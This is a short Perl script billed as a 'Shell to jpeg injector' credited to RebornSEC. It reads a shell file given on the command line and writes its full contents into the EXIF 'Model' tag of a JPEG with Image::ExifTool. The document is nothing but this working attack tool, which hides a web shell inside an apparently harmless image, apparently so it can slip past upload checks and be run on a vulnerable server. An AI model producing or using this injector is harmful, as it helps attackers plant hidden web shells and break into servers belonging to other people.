use Image::ExifTool;
 
print q(
 
+-------------------------------------------+
   Shell to jpeg injector Mod by RebornSEC
+-------------------------------------------+
 
);
 
die "[-]Usage: perl RInjector.pl <FILE> <IMAGE>\n" unless @ARGV == 2;
 
my $file = $ARGV[0];
my $jpeg = $ARGV[1];
print "[+]Image = $jpeg \n";
print "[+]Shell = $file \n";
 
open (HANDLE, $file);
@array = <HANDLE>;
my $string = join("\n", @array);
 
 
my $tool = Image::ExifTool->new();
 
$tool->ExtractInfo($jpeg);
$tool->SetNewValue("Model", $string);
$done = $tool->WriteInfo($jpeg);
